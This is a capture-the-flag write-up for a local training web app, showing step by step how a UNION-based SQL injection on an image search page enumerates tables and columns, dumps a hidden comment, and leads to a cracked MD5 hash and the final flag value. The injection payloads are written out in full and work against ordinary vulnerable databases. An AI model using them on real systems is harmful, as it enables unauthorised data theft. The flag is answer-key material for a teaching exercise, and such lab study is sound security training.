# EXPLANATIONS

Based on the same principle as the "search member" SQL injection vulnerability, we discover that the page http://127.0.0.1:8080/index.php?page=searchimg is also vulnerable to SQL injection.

There are also 2 fields to input into the SQL query.

We follow the same steps:

1 UNION ALL SELECT 1, table_name FROM information_schema.tables WHERE table_schema = database(); gives us "list_images" for the table name

1 UNION ALL SELECT 1, column_name FROM information_schema.columns WHERE table_name = 0x6c6973745f696d61676573; (list_images in hexadecimal) returns id, url, title, comment for the columns names

1 UNION ALL SELECT 1, title FROM list_images; gives us "hack me?" for the last line

1 UNION ALL SELECT 1, comment FROM list_images; gives: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 After decoding this on the MD5 site, we get "albatroz".
Then we use the command echo -n albatroz | shasum -a 256 to get the flag:

**f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188**

# SOLUTIONS

Same solutions as for the "search_member_sql_injection" flag.